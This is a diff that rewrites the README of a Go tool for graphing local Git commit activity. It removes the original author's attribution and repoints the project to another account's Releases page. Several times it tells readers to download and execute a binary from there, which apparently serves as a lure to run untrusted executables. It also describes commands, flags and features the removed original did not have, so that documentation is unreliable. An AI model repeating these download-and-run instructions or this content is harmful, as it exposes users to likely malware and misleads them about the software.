@@ -1,160 +1,232 @@
-# 🚀 Go Git Local Status
+# Go Git Local Status — Local Git Contribution Graph CLI Visualizer
 
-> **Note**: This project is based on the tutorial ["Visualize your local Git contributions with Go"](https://flaviocopes.com/go-git-contributions/) by Flavio Copes. The original tutorial provides a comprehensive guide on building a Git stats analysis CLI tool using Go.
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/Cephas1818/go_git_local_status/releases)
 
-[![Go Version](https://img.shields.io/badge/Go-1.24.5+-blue.svg)](https://golang.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/banghuazhao/go_git_local_status?style=social)](https://github.com/banghuazhao/go_git_local_status)
-[![GitHub Followers](https://img.shields.io/github/followers/banghuazhao?style=social)](https://github.com/banghuazhao)
+A Go CLI that builds GitHub-style contribution graphs from local Git repos. View activity across many projects in the terminal. Track commit counts by day. Compare projects. Export data.
 
-A powerful Go application that analyzes your local Git repositories and generates a beautiful GitHub-style contribution graph showing your coding activity over the last 6 months. Perfect for developers who want to track their local development activity across multiple repositories!
+- Topics: cli, coding-activity, command-line, contribution-graph, developer-tools, development-tracking, git, git-analysis, git-history, git-stats, go, go-cli, golang, local-repositories, productivity, repository-analysis, terminal, terminal-app, visualization
 
-## ✨ Features
+Badges
+- Build: ![Go](https://img.shields.io/badge/go-1.20+-00ADD8?logo=go)
+- License: ![MIT](https://img.shields.io/badge/license-MIT-green)
+- Releases: [https://github.com/Cephas1818/go_git_local_status/releases](https://github.com/Cephas1818/go_git_local_status/releases)
 
-- 🔍 **Smart Repository Discovery** - Recursively scans directories for Git repositories
-- 📊 **GitHub-Style Visualization** - Beautiful contribution graph with colored cells
-- 📅 **6-Month Activity Overview** - Complete view of your coding patterns
-- 🎨 **Intelligent Color Coding** - White, yellow, green based on activity levels
-- ⚡ **Lightning Fast** - Processes hundreds of repositories efficiently
-- 🛡️ **Robust Error Handling** - Gracefully handles problematic repositories
-- 🎯 **Email Filtering** - Focus on your specific contributions
-- 📱 **Cross-Platform** - Works on macOS, Linux, and Windows
+Screenshots
 
-## 🎯 Why Use This Tool?
+Terminal heatmap (example)
+![Contribution graph example](https://raw.githubusercontent.com/github/explore/main/topics/graph/graph.png)
 
-- **Track Your Progress** - See your coding activity patterns over time
-- **Local Development Focus** - Analyze repositories not on GitHub
-- **Multiple Repository Support** - Get insights across all your projects
-- **Beautiful Output** - GitHub-style graphs in your terminal
-- **Privacy First** - All analysis happens locally on your machine
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- Go 1.24.5 or higher
-- Git repositories on your local machine
-
-### Installation
-
-1. **Clone the repository:**
-```bash
-git clone https://github.com/banghuazhao/go_git_local_status.git
-cd go_git_local_status
+ASCII example output
+```
+Repo: ~/projects/api
+Mon Tue Wed Thu Fri Sat Sun
+ 0   1   3   2   4   0   0
+ 1   0   0   2   5   1   0
+ 3   4   2   0   1   0   0
 ```
 
-2. **Install dependencies:**
-```bash
-go mod tidy
+Why use this tool
+
+- View local commit activity with the same mental model as GitHub contributions.
+- Aggregate data from many repos in a single view.
+- Run in terminals and scripts.
+- Export CSV or JSON for reporting and dashboards.
+- Use in dotfiles, CI reports, or daily dev metrics.
+
+Install
+
+1) Go install
+```
+go install github.com/Cephas1818/go_git_local_status@latest
+```
+After install, the binary will live in $GOPATH/bin or $HOME/go/bin. Add that to PATH if needed.
+
+2) Download a release binary
+Download the binary file for your platform from the Releases page and run it.
+You must download and execute the asset file from:
+https://github.com/Cephas1818/go_git_local_status/releases
+
+Examples
+
+Scan a single repo
+```
+go-git-local-status scan ~/projects/myrepo
 ```
 
-3. **Run the tool:**
-```bash
-go run . -folder "/path/to/your/projects" -email "your.email@example.com"
+Scan multiple repos
+```
+go-git-local-status scan ~/projects/*
 ```
 
-## 📊 Example Output
-
-![Git Local Status Example](screenshots/example.png)
-
-*Example output showing a GitHub-style contribution graph generated from local Git repositories*
-
-## 🎨 Color Legend
-
-- `-` : No commits (gray)
-- `1-4` : Light activity (white background)
-- `5-9` : Medium activity (yellow background)
-- `10+` : High activity (green background)
-
-## ⚙️ Command Line Options
-
-- `-folder string`: Directory to scan for Git repositories
-- `-email string`: Email address to filter commits (default: "your@email.com")
-
-## 🔧 How It Works
-
-1. **Repository Discovery**: Recursively scans the specified directory for `.git` folders
-2. **Commit Analysis**: For each repository, reads the Git history and filters commits by email
-3. **Date Calculation**: Calculates days since each commit and applies offset for proper graph alignment
-4. **Graph Generation**: Creates a GitHub-style contribution graph with color-coded cells
-5. **Output Display**: Shows the graph with month labels and day-of-week alignment
-
-## 📁 Project Structure
-
+Aggregate across a parent folder and show a 52-week heatmap
 ```
-go_git_local_status/
-├── main.go          # Main entry point and flag parsing
-├── scan.go          # Repository discovery and Git folder scanning
-├── stats.go         # Commit analysis and graph generation
-├── screenshots/     # Example outputs and documentation
-├── go.mod           # Go module dependencies
-├── go.sum           # Dependency checksums
-└── README.md        # This file
+go-git-local-status heatmap --path ~/work --weeks 52
 ```
 
-## 🛠️ Dependencies
+Export JSON
+```
+go-git-local-status export --path ~/work --format json --out commits.json
+```
 
-- [go-git/go-git/v5](https://github.com/go-git/go-git) - Git repository operations
-- Standard Go libraries (flag, fmt, log, os, strings, time)
+Show per-repo breakdown
+```
+go-git-local-status report --path ~/work --group-by repo
+```
 
-## 🛡️ Error Handling
+Commands and flags
 
-The application gracefully handles:
-- Empty Git repositories
-- Repositories without HEAD references
-- Corrupted Git repositories
-- Permission errors
-- Invalid repository paths
+- scan
+  - --path string: Path to repo or folder.
+  - --since date: Start date (YYYY-MM-DD).
+  - --until date: End date (YYYY-MM-DD).
+  - --depth int: Depth to scan subfolders.
+- heatmap
+  - --weeks int: Number of weeks to display.
+  - --theme string: color|mono (terminal colors).
+  - --min int: Minimum count for heat threshold.
+- export
+  - --format: json|csv
+  - --out: Output file path.
+- report
+  - --group-by: repo|author|path
+  - --top N: Show top N repos by commit count.
 
-## ⚡ Performance
+Output modes
 
-- Processes multiple repositories efficiently
-- Skips problematic repositories without stopping
-- Memory-efficient commit iteration
-- Fast directory scanning
+- Terminal heatmap: Color squares or characters for each day.
+- Plain ASCII: For terminals without color.
+- CSV/JSON: Rows of date, repo, author, commits.
+- Image export (SVG): Generates a static contribution graph SVG for embedding in docs.
 
-## 🤝 Contributing
+Use cases
 
-We love contributions! Here's how you can help:
+- Personal metrics: See your work pattern across many projects.
+- Team snapshot: Collect commit activity across a monorepo or org folder.
+- Backup reports: Export commit counts for audits.
+- Embedding: Include a generated SVG in your personal site or README.
+- Automation: Run in cron to create weekly reports.
 
-1. ⭐ **Star this repository** if you find it useful
-2. 🐛 **Report bugs** by opening an issue
-3. 💡 **Suggest features** through issues
-4. 🔧 **Submit pull requests** for improvements
-5. 📖 **Improve documentation**
+How it works
 
-### Development Setup
+- The tool runs git log in each repo folder.
+- It parses commit date, author, and commit count.
+- It aggregates commits per day, per repo.
+- It maps counts to intensity levels for the heatmap.
+- It renders a grid of weeks x days like GitHub contributions.
+- It can export raw data for external analysis.
 
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Make your changes
-4. Add tests if applicable
-5. Commit your changes: `git commit -m 'Add amazing feature'`
-6. Push to the branch: `git push origin feature/amazing-feature`
-7. Open a Pull Request
+Performance notes
 
-## 📄 License
+- The tool reads commit history. It scales with repo size.
+- For large histories, use --since or --until to restrict range.
+- Use --depth to limit scanned subfolders when scanning a parent folder.
+- The tool spawns git subprocesses per repo. Run on multi-core systems for faster results.
 
-This project is open source and available under the [MIT License](LICENSE).
+Customization
 
-## 👨‍💻 Author
+- Theme: Choose color or mono. Terminal palette adapts to ANSI 256 colors.
+- Thresholds: Set intensity buckets to change visual mapping.
+- Grouping: Group by repo, author, or folder path.
+- Output: Choose ASCII, color, SVG, JSON, or CSV.
 
-**Created by [@banghuazhao](https://github.com/banghuazhao)**
+Examples: real workflows
 
-- 🔗 **GitHub**: [@banghuazhao](https://github.com/banghuazhao)
-- 🚀 **More Projects**: Check out my other repositories for more amazing tools!
+1) Weekly email snapshot
+- Run a scan in CI each Sunday.
+- Export JSON.
+- Generate a small SVG.
+- Attach SVG to an automated email.
 
-## ⭐ Show Your Support
+2) Local dotfiles integration
+- Add a cron job that saves the heatmap as SVG to ~/public.
+- Show it on your personal site with a static image.
 
-If this project helps you track your development activity, please consider:
+3) Team metrics
+- Collect data from a shared workspace folder.
+- Run report --group-by repo --top 10 to get the busiest projects.
 
-- ⭐ **Starring this repository**
-- 👥 **Following me on GitHub**
-- 🐛 **Reporting bugs or suggesting features**
-- 💬 **Sharing with your developer friends**
+Integration tips
 
----
+- Use with tmux: The CLI fits in a pane. Resize to change layout.
+- Shell prompt: Pipe the top N repos to a prompt helper.
+- Git hooks: Add a post-commit hook to run a local scan and update a cache.
 
-**💡 Pro Tip**: This tool is perfect for developers who work across multiple local repositories and want to visualize their coding patterns, similar to GitHub's contribution graph but for your local development environment.
+API and scripting
 
-**🎯 Perfect For**: Software engineers, developers, and anyone who wants to track their local Git activity patterns!
+- The CLI returns exit codes for success and errors.
+- Use --format json to parse output in scripts.
+- Example: get today's total commits
+```
+go-git-local-status scan --path ~/work --since $(date +%F) --format json | jq '.total'
+```
+
+Internals (for contributors)
+
+- Language: Go
+- Core packages:
+  - git: uses git CLI via os/exec for compatibility.
+  - parser: parses git log output to structs.
+  - aggregator: builds date -> count maps.
+  - render: renders terminal, ascii, SVG, CSV, JSON.
+- Design goals:
+  - Small binary
+  - Minimal runtime deps
+  - Fast I/O and concurrent repo scanning
+
+Contributing
+
+- Fork the repo.
+- Create a branch per feature or fix.
+- Write tests for core parsing logic.
+- Keep commits focused and small.
+- Open a PR with a clear description and examples.
+
+Release downloads
+
+Download the binary file for your OS and CPU from the Releases page. After download, mark the file executable and run it. The Releases page is here:
+https://github.com/Cephas1818/go_git_local_status/releases
+
+License
+
+- MIT
+
+Security
+
+- The tool runs git commands and reads repository history. It does not send data over the network by default.
+- Review the code before running in sensitive environments.
+
+Common issues and resolutions
+
+- No output for a repo
+  - Ensure the path contains a .git folder.
+  - Run git status in the folder to confirm.
+- Slow scan
+  - Limit the date range with --since.
+  - Use --depth to reduce the number of scanned subfolders.
+- Color looks wrong
+  - Switch to --theme mono or adjust terminal color settings.
+
+FAQ
+
+Q: Can I include uncommitted work?
+A: No. The tool reads commit history. It cannot see uncommitted changes.
+
+Q: Can I attribute commits by author email?
+A: Yes. Use --group-by author and the tool will list per-author counts.
+
+Q: Can I get a per-hour heatmap?
+A: The core view focuses on daily counts. Export raw data and aggregate by hour externally.
+
+Acknowledgements
+
+- Inspired by GitHub's contribution graph.
+- Uses the git CLI for history parsing.
+- Uses Go for static binaries and speed.
+
+Contact
+
+- Report issues and feature requests on the repository Issues page.
+- For release binaries and assets, download the file and run it from:
+https://github.com/Cephas1818/go_git_local_status/releases
+
+License: MIT
